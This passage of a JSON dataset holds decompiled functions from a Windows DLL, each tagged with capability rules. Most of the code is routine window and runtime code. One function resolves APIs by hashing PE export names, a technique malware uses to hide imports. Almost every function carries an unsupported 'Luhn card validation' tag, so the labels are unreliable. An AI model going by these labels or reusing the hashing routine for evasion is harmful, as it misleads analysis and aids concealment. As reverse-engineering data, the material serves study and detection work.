        "decompiled_code": "\nuint64_t fcn.180001acc(void)\n\n{\n    ulong arg1;\n    int32_t iVar1;\n    uint64_t uVar2;\n    ulong auStack56 [2];\n    uint32_t uStack40;\n    \n    arg1 = *0x1800736c0;\n    (*_sym.imp.USER32.dll_LoadStringW)(*0x1800736c0, 0x67, 0x1800737a0);\n    (*_sym.imp.USER32.dll_LoadStringW)(arg1, 0x6d, 0x1800736d0);\n    fcn.180001b70(arg1);\n    uVar2 = fcn.180001be4(arg1);\n    if (uVar2 != 0) {\n        while (iVar1 = (*_sym.imp.USER32.dll_GetMessageW)(auStack56, 0, 0, 0),  iVar1 != 0) {\n            iVar1 = (*_sym.imp.USER32.dll_TranslateAcceleratorW)(auStack56[0]);\n            if (iVar1 == 0) {\n                (*_sym.imp.USER32.dll_TranslateMessage)(auStack56);\n                (*_sym.imp.USER32.dll_DispatchMessageW)(auStack56);\n            }\n        }\n        uVar2 = uStack40;\n    }\n    return uVar2;\n}\n",
        "token_count": 290
    },
    "180001b7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180001b70(ulong arg1)\n\n{\n    ulong ARG_0;\n    ulong var_48h;\n    ulong var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_28h;\n    ulong var_20h;\n    ulong uStack32;\n    ulong var_10h;\n    ulong var_8h;\n    \n    var_40h._0_4_ = 0;\n    var_40h._4_4_ = 0;\n    var_30h = 0;\n    var_48h = 0x180001f68;\n    ARG_0._0_4_ = 0x50;\n    ARG_0._4_4_ = 3;\n    var_38h = arg1;\n    var_28h = (*_sym.imp.USER32.dll_LoadCursorW)(0, 0x7f00);\n    var_8h = 0;\n    var_10h = 0x1800736d0;\n    var_20h = *0x180068130;\n    uStack32 = *0x180068138;\n    (*_sym.imp.USER32.dll_RegisterClassExW)(*0x180068130, &ARG_0);\n    return;\n}\n",
        "token_count": 285
    },
    "180001be": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180001be4(ulong arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExW)\n                      (0, 0x1800736d0, 0x1800737a0, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg1, 0);\n    if (iVar1 != 0) {\n        (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 1);\n        (*_sym.imp.USER32.dll_UpdateWindow)(iVar1);\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 157
    },
    "180001c5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.180001c5c(char *arg1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0;\n    for (; cVar1 = *arg1,  cVar1 != '\\0'; arg1 = arg1 + 1) {\n        iVar2 = cVar1 + -0x20;\n        if (cVar1 < 'a') {\n            iVar2 = cVar1;\n        }\n        uVar3 = (uVar3 >> 0xd | uVar3 << 0x13) + iVar2;\n    }\n    return *0x1800736c8 + uVar3;\n}\n",
        "token_count": 156
    },
    "180001c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "resolve function by parsing PE exports"
        ],
        "decompiled_code": "\nint64_t fcn.180001c8c(int64_t arg1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint32_t *puVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uint32_t uVar7;\n    uint64_t uVar8;\n    \n    uVar8 = 0;\n    iVar3 = *(*(arg1 + 0x3c) + 0x88 + arg1) + arg1;\n    iVar6 = *(iVar3 + 0x1c) + arg1;\n    iVar5 = *(iVar3 + 0x24) + arg1;\n    uVar1 = *(iVar3 + 0x18);\n    puVar4 = *(iVar3 + 0x20) + arg1;\n    if (uVar1 != 0) {\n        do {\n            iVar2 = fcn.180001c5c(*puVar4 + arg1);\n            if (iVar2 == 0x7708415a) {\n                return *(iVar6 + *(iVar5 + uVar8 * 2) * 4) + arg1;\n            }\n            uVar7 = uVar8 + 1;\n            uVar8 = uVar7;\n            puVar4 = puVar4 + 1;\n        } while (uVar7 < uVar1);\n    }\n    return 0;\n}\n",
        "token_count": 313
    },
    "180001d1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180001d10(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ntdll.dll_ZwOpenSymbolicLinkObject)(0, 0, 0);\n    if ((iVar1 != 0) && (iVar1 = (*_sym.imp.ntdll.dll_ZwOpenSymbolicLinkObject)(0, 0, 0),  iVar1 != 0)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 105
    },
    "18003fb1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18003fb14(int64_t lpMem)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    \n    if ((lpMem != 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x180072ba8, 0, lpMem),  iVar2 == 0)) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar4 = fcn.18003c314(uVar3);\n        puVar1 = fcn.18003c3e8();\n        *puVar1 = uVar4;\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "1800034c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800034c8(void)\n\n{\n    ulong *puVar1;\n    ulong *arg1;\n    \n    arg1 = (*_sym.imp.KERNEL32.dll_InterlockedFlushSList)(0x180072230);\n    while (arg1 != NULL) {\n        puVar1 = *arg1;\n        fcn.18001887c(arg1);\n        arg1 = puVar1;\n    }\n    return;\n}\n",
        "token_count": 94
    },
    "18000350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180003508(void)\n\n{\n    int64_t *piVar1;\n    \n    for (piVar1 = 0x180068c10; piVar1 < 0x180068c10; piVar1 = piVar1 + 1) {\n        if (*piVar1 != 0) {\n            (**0x18005d3f0)();\n        }\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "18000354": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180003544(void)\n\n{\n    int64_t *piVar1;\n    \n    for (piVar1 = 0x180068c20; piVar1 < 0x180068c20; piVar1 = piVar1 + 1) {\n        if (*piVar1 != 0) {\n            (**0x18005d3f0)();\n        }\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "1800089e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800089e0(void)\n\n{\n    uint64_t uVar1;\n    \n    uVar1 = *0x180072310;\n    while (uVar1 != 0) {\n        uVar1 = uVar1 - 1;\n        (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(uVar1 * 0x28 + 0x1800722e8);\n        *0x180072310 = *0x180072310 - 1;\n    }\n    return 1;\n}\n",
        "token_count": 113
    },
    "180011f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180011f80(ulong arg1, ulong *arg2)\n\n{\n    fcn.180008a50(arg1, *arg2, 2);\n    return;\n}\n",
        "token_count": 42
    },
    "180011fb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180011fb0(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    ulong arg1_00;\n    \n    pcVar1 = fcn.180008a50(arg1, arg2, arg4);\n    (*pcVar1)(arg3);\n    arg1_00 = fcn.180008a80();\n    fcn.180008a50(arg1_00, arg2, 2);\n    return;\n}\n",
        "token_count": 109
    },
    "18001522": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180015220(int64_t arg1)\n\n{\n    int64_t arg1_00;\n    \n    arg1_00 = fcn.180014ed0(arg1);\n    *(arg1 + 0x18) = *(arg1_00 + 0x90);\n    *(arg1 + 0x20) = *(arg1_00 + 0x88);\n    fcn.18003c554(arg1_00, arg1 + 0x18);\n    fcn.18003c5c0(arg1_00, arg1 + 0x20);\n    if ((*(arg1_00 + 0x3a8) & 2) == 0) {\n        *(arg1_00 + 0x3a8) = *(arg1_00 + 0x3a8) | 2;\n        *(arg1 + 0x28) = 2;\n    }\n    return;\n}\n",
        "token_count": 206
    },
    "18001631": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180016314(ulong noname_0, uint32_t *arg2, ulong arg3, uint32_t *arg4)\n\n{\n    fcn.18003f700(*arg2);\n    fcn.180016414(arg3);\n    fcn.18003f754(*arg4);\n    return;\n}\n",
        "token_count": 72
    },
    "180017b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180017b88(int64_t *arg1)\n\n{\n    if (*arg1 != *0x180072718) {\n        fcn.180017844(*arg1);\n    }\n    return;\n}\n",
        "token_count": 48
    },
    "180017ba": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180017ba4(int64_t *arg1)\n\n{\n    if (*arg1 != *0x180072710) {\n        fcn.180017888(*arg1);\n    }\n    return;\n}\n",
        "token_count": 48
    },
    "18001788": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180017888(int64_t *arg1)\n\n{\n    int64_t lpMem;\n    int64_t *piVar1;\n    \n    if (arg1 != NULL) {\n        lpMem = *arg1;\n        piVar1 = arg1;\n        while (lpMem != 0) {\n            fcn.18003fb14(lpMem);\n            piVar1 = piVar1 + 1;\n            lpMem = *piVar1;\n        }\n        fcn.18003fb14(arg1);\n    }\n    return;\n}\n",
        "token_count": 119
    },
    "180017dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.180017dcc(void)\n\n{\n    int64_t *lpMem;\n    int64_t lpMem_00;\n    int64_t *piVar1;\n    \n    fcn.180017b88(0x180072700);\n    fcn.180017ba4(0x180072708);\n    fcn.180017844(*0x180072718);\n    lpMem = *0x180072710;\n    if (*0x180072710 != NULL) {\n        lpMem_00 = **0x180072710;\n        piVar1 = *0x180072710;\n        while (lpMem_00 != 0) {\n            fcn.18003fb14(lpMem_00);\n            piVar1 = piVar1 + 1;\n            lpMem_00 = *piVar1;\n        }\n        fcn.18003fb14(lpMem);\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "1800174c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800174c4(void)\n\n{\n    int64_t iVar1;\n    int64_t arg1;\n    ulong uVar2;\n    int64_t iVar3;\n    \n    uVar2 = 0;\n    if (*0x180072700 == 0) {\n        fcn.180042478();\n        arg1 = fcn.180042f98();\n        if (arg1 == 0) {\n            fcn.18003fb14(0);\n            uVar2 = 0xffffffff;\n        }\n        else {\n            iVar3 = fcn.180017618(arg1);\n            iVar1 = iVar3;\n            if (iVar3 == 0) {\n                uVar2 = 0xffffffff;\n                iVar3 = *0x180072700;\n                iVar1 = *0x180072718;\n            }\n            *0x180072718 = iVar1;\n            *0x180072700 = iVar3;\n            fcn.18003fb14(0);\n            fcn.18003fb14(arg1);\n        }\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 248
    },
    "180017f5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.180017f58(ulong noname_0, uint32_t *arg2, ulong arg3, uint32_t *arg4)\n\n{\n    uint uVar1;\n    \n    fcn.18003f700(*arg2);\n    uVar1 = fcn.1800182a8(arg3);\n    fcn.18003f754(*arg4);\n    return uVar1;\n}\n",
        "token_count": 89
    },
    "18001847": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180018478(ulong arg1, ulong arg2)\n\n{\n    ulong uStackX8;\n    ulong uStackX16;\n    ulong var_20h_2;\n    ulong var_28h;\n    ulong var_20h;\n    ulong *var_18h;\n    ulong *var_bp_10h;\n    \n    var_18h = &uStackX8;\n    var_bp_10h = &uStackX16;\n    var_28h._0_4_ = 2;\n    var_20h._0_4_ = 2;\n    uStackX8 = arg1;\n    uStackX16 = arg2;\n    fcn.180017f1c(&var_20h_2, &var_20h, &var_18h, &var_28h);\n    return;\n}\n",
        "token_count": 193
    },
    "18001840": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001840c(ulong arg1)\n\n{\n    ulong uStackX8;\n    uchar auStackX16 [8];\n    uint auStackX24 [2];\n    uint auStackX32 [2];\n    ulong *puStack24;\n    ulong uStack16;\n    \n    uStack16 = 0xfffffffffffffffe;\n    puStack24 = &uStackX8;\n    auStackX24[0] = 2;\n    auStackX32[0] = 2;\n    uStackX8 = arg1;\n    fcn.180017f58(auStackX16, auStackX32, &puStack24, auStackX24);\n    return;\n}\n",
        "token_count": 151
    },
    "1800186f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.1800186f4(ulong param_1, ulong param_2)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.18003d148(param_1, param_2);\n    return iVar1 != 0;\n}\n",
        "token_count": 58
    },
    "18001875": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar fcn.180018750(void)\n\n{\n    fcn.18003d30c();\n    return 1;\n}\n",
        "token_count": 27
    },
    "18001876": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180018760(int64_t *arg1, int64_t *arg2)\n\n{\n    if (arg1 != arg2) {\n        do {\n            if (*arg1 != 0) {\n                (**0x18005d3f8)();\n            }\n            arg1 = arg1 + 1;\n        } while (arg1 != arg2);\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "1800187a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800187a4(int64_t *arg1, int64_t *arg2)\n\n{\n    ulong uVar1;\n    bool bVar2;\n    \n    bVar2 = arg1 == arg2;\n    while( true ) {\n        if (bVar2) {\n            return 0;\n        }\n        if ((*arg1 != 0) && (uVar1 = (**0x18005d3f8)(),  uVar1 != 0)) break;\n        arg1 = arg1 + 1;\n        bVar2 = arg1 == arg2;\n    }\n    return uVar1;\n}\n",
        "token_count": 136
    },
    "18003b4e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.18003b4e0(uint64_t param_1)\n\n{\n    uint64_t uStackX8;\n    \n    uStackX8 = param_1;\n    if ((param_1 & 0x7ff0000000000000) == 0x7ff0000000000000) {\n        if ((param_1 & 0xfffffffffffff) == 0) {\n            uStackX8 = 0xfff8000000000000;\n            fcn.18003b784(0x18005f7d8, 0x1e, 0xfff8000000000000, 1);\n        }\n        else {\n            uStackX8 = param_1 | 0x8000000000000;\n        }\n    }\n    return uStackX8;\n}\n",
        "token_count": 177
    },
    "18003bb3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18003bb34(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    int64_t lpFlsData;\n    uint auStackX8 [2];\n    \n    iVar1 = *arg1;\n    lpFlsData = 0;\n    if (iVar1 == 0) {\n        auStackX8[0] = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (*(arg1 + 2) == '\\0') {\n            arg1[1] = 0;\n            *(arg1 + 2) = 1;\n        }\n        else {\n            lpFlsData = arg1[1];\n        }\n        iVar1 = fcn.18003d210(auStackX8, lpFlsData);\n        *arg1 = iVar1;\n        (*_sym.imp.KERNEL32.dll_SetLastError)(auStackX8[0]);\n    }\n    return iVar1;\n}\n",
        "token_count": 203
    },
    "18003bc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18003bc04(int64_t arg1, int64_t arg2)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    \n    iVar2 = 0;\n    if (*(arg2 + 0x10) == '\\0') {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        *(arg2 + 8) = 0;\n        *(arg2 + 0x10) = 1;\n        (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n    }\n    else {\n        iVar2 = *(arg2 + 8);\n    }\n    return arg1 + iVar2 * 8;\n}\n",
        "token_count": 149
    },
    "18003c35": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18003c35c(uint64_t arg1)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    uint64_t arg1_00;\n    ulong in_RDX;\n    \n    arg1_00 = arg1 & 0xffffffff;\n    iVar2 = fcn.18003d148(arg1, in_RDX);\n    if (iVar2 == 0) {\n        puVar3 = 0x180071074;\n    }\n    else {\n        puVar3 = iVar2 + 0x24;\n    }\n    *puVar3 = arg1_00;\n    uVar1 = fcn.18003c314(arg1_00);\n    iVar2 = fcn.18003d148(arg1_00, in_RDX);\n    puVar3 = 0x180071070;\n    if (iVar2 != 0) {\n        puVar3 = iVar2 + 0x20;\n    }\n    *puVar3 = uVar1;\n    return;\n}\n",
        "token_count": 225
    },
    "18003c3a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18003c3a4(ulong arg1, int64_t arg2)\n\n{\n    uint uVar1;\n    \n    *(arg2 + 0x38) = 1;\n    *(arg2 + 0x34) = arg1;\n    uVar1 = fcn.18003c314(arg1);\n    *(arg2 + 0x2c) = uVar1;\n    *(arg2 + 0x30) = 1;\n    return;\n}\n",
        "token_count": 107
    },
    "18003c52": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18003c520(int64_t arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    \n    if ((*arg2 != *0x180072768) && ((*0x1800718a4 & *(arg1 + 0x3a8)) == 0)) {\n        iVar1 = fcn.18004ace0();\n        *arg2 = iVar1;\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "18003c55": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18003c554(int64_t arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    int64_t in_R8;\n    \n    if ((*arg2 != *(in_R8 * 8 + 0x180072768)) && ((*0x1800718a4 & *(arg1 + 0x3a8)) == 0)) {\n        iVar1 = fcn.18004ace0();\n        *arg2 = iVar1;\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "18003c58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18003c58c(int64_t arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    \n    if ((*arg2 != *0x1800729c0) && ((*0x1800718a4 & *(arg1 + 0x3a8)) == 0)) {\n        iVar1 = fcn.1800424d8();\n        *arg2 = iVar1;\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "18003c5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18003c5c0(int64_t arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    int64_t in_R8;\n    \n    if ((*arg2 != *(in_R8 * 8 + 0x1800729c0)) && ((*0x1800718a4 & *(arg1 + 0x3a8)) == 0)) {\n        iVar1 = fcn.1800424d8();\n        *arg2 = iVar1;\n    }\n    return;\n}\n",
        "token_count": 117
    },
    "18003f71": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18003f71c(void)\n\n{\n    uint64_t uVar1;\n    \n    uVar1 = *0x1800729a0;\n    while (uVar1 != 0) {\n        uVar1 = uVar1 - 1;\n        (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(uVar1 * 0x28 + 0x180072770);\n        *0x1800729a0 = *0x1800729a0 - 1;\n    }\n    return 1;\n}\n",
        "token_count": 117
    },
    "18003fcf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.18003fcf4(int16_t *arg1, int64_t arg2, ulong noname_2, ulong arg4)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint32_t *puVar4;\n    uint64_t uVar5;\n    uint64_t arg1_00;\n    \n    if (arg1 == NULL) {\n        if (*(arg2 + 0x28) != '\\0') {\n            fcn.18003fb14(*(arg2 + 0x10));\n            *(arg2 + 0x28) = 0;\n        }\n        *(arg2 + 0x10) = 0;\n        *(arg2 + 0x18) = 0;\n    }\n    else {\n        if (*arg1 != 0) {\n            iVar2 = fcn.180042e48(arg4, 0, arg1, 0xffffffff);\n            arg1_00 = iVar2;\n            if (iVar2 != 0) {\n                if (*(arg2 + 0x18) < arg1_00) {\n                    if (*(arg2 + 0x28) != '\\0') {\n                        fcn.18003fb14(*(arg2 + 0x10));\n                        *(arg2 + 0x28) = 0;\n                    }\n                    iVar3 = fcn.180047050(arg1_00);\n                    *(arg2 + 0x10) = iVar3;\n                    uVar1 = ~-(iVar3 != 0) & 0xc;\n                    uVar5 = 0;\n                    if (uVar1 == 0) {\n                        uVar5 = arg1_00;\n                    }\n                    *(arg2 + 0x28) = uVar1 == 0;\n                    *(arg2 + 0x18) = uVar5;\n                    if (uVar1 != 0) {\n                        return uVar1;\n                    }\n                }\n                iVar2 = fcn.180042e48(arg4, 0, arg1, 0xffffffff);\n                if (iVar2 != 0) {\n                    *(arg2 + 0x20) = iVar2 + -1;\n                    return 0;\n                }\n            }\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            fcn.18003c35c(uVar1);\n            puVar4 = fcn.18003c3e8();\n            return *puVar4;\n        }\n        if (*(arg2 + 0x18) == 0) {\n            if (*(arg2 + 0x28) != '\\0') {\n                fcn.18003fb14(*(arg2 + 0x10));\n                *(arg2 + 0x28) = 0;\n            }\n            iVar3 = fcn.180047050(1);\n            *(arg2 + 0x10) = iVar3;\n            uVar1 = ~-(iVar3 != 0) & 0xc;\n            *(arg2 + 0x28) = uVar1 == 0;\n            *(arg2 + 0x18) = uVar1 == 0;\n            if (uVar1 != 0) {\n                return uVar1;\n            }\n        }\n        **(arg2 + 0x10) = 0;\n    }\n    *(arg2 + 0x20) = 0;\n    return 0;\n}\n",
        "token_count": 745
    },
    "180041ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.180041ecc(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    ushort *puVar3;\n    int64_t iVar4;\n    \n    fcn.180004940(arg1 + 0x18, 0, 0x101);\n    iVar2 = 0;\n    *(arg1 + 4) = 0;\n    *(arg1 + 0x220) = 0;\n    puVar3 = arg1 + 0xc;\n    for (iVar1 = 6; iVar4 = iVar2,  iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    do {\n        iVar1 = iVar4 + 1;\n        *(arg1 + iVar4 + 0x18) = *(iVar4 + 0x180071218);\n        iVar4 = iVar1;\n    } while (iVar1 < 0x101);\n    do {\n        iVar1 = iVar2 + 1;\n        *(arg1 + iVar2 + 0x119) = *(iVar2 + 0x180071319);\n        iVar2 = iVar1;\n    } while (iVar1 < 0x100);\n    return;\n}\n",
        "token_count": 285
    },
    "1800424d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.1800424d8(ulong param_1, ulong param_2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *lpMem;\n    \n    piVar2 = fcn.18003cfd0(param_1, param_2);\n    if (((piVar2[0xea] & *0x1800718a4) == 0) || (*(piVar2 + 0x24) == 0)) {\n        fcn.18003f700(5);\n        lpMem = *(piVar2 + 0x22);\n        if (lpMem != *0x1800729c0) {\n            if (lpMem != NULL) {\n                LOCK();\n                iVar1 = *lpMem;\n                *lpMem = *lpMem + -1;\n                if ((iVar1 == 1) && (lpMem != 0x180071200)) {\n                    fcn.18003fb14(lpMem);\n                }\n            }\n            lpMem = *0x1800729c0;\n            *(piVar2 + 0x22) = *0x1800729c0;\n            LOCK();\n            *lpMem = *lpMem + 1;\n        }\n        piVar2 = 0x5;\n        fcn.18003f754(5);\n    }\n    else {\n        lpMem = *(piVar2 + 0x22);\n    }\n    if (lpMem != NULL) {\n        return lpMem;\n    }\n    fcn.1800188ac();\n    return piVar2;\n}\n",
        "token_count": 346
    },
    "180042f9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180042f98(void)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int16_t *arg3;\n    int64_t iVar3;\n    int16_t *piVar5;\n    uint64_t uVar6;\n    int64_t iVar4;\n    \n    arg3 = (*_sym.imp.KERNEL32.dll_GetEnvironmentStringsW)();\n    if (arg3 != NULL) {\n        iVar1 = *arg3;\n        piVar5 = arg3;\n        while (iVar1 != 0) {\n            iVar3 = -1;\n            do {\n                iVar4 = iVar3;\n                iVar3 = iVar4 + 1;\n            } while (piVar5[iVar3] != 0);\n            piVar5 = piVar5 + iVar4 + 2;\n            iVar1 = *piVar5;\n        }\n        uVar6 = piVar5 + (2 - arg3) >> 1;\n        iVar2 = fcn.180042e48(0, 0, arg3, uVar6 & 0xffffffff);\n        if (iVar2 != 0) {\n            iVar3 = fcn.180047050(iVar2);\n            if (iVar3 != 0) {\n                iVar2 = fcn.180042e48(0, 0, arg3, uVar6 & 0xffffffff);\n                if (iVar2 == 0) {\n                    fcn.18003fb14(iVar3);\n                    iVar3 = 0;\n                }\n                else {\n                    fcn.18003fb14(0);\n                }\n                (*_sym.imp.KERNEL32.dll_FreeEnvironmentStringsW)(arg3);\n                return iVar3;\n            }\n            fcn.18003fb14(0);\n        }\n        (*_sym.imp.KERNEL32.dll_FreeEnvironmentStringsW)(arg3);\n    }\n    return 0;\n}\n",
        "token_count": 405
    },
    "18004487": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180044870(ulong arg1)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    \n    iVar1 = fcn.18004440c(0x18, \"AppPolicyGetProcessTerminationMethod\", 0x1800611e0, 0x1800611e4);\n    if (iVar1 != 0) {\n    // WARNING: Could not recover jumptable at 0x0001800448b6. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar2 = (**0x18005d3f8)(0xfffffffffffffffa, arg1);\n        return uVar2;\n    }\n    return 0xc0000225;\n}\n",
        "token_count": 158
    },
    "1800449d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
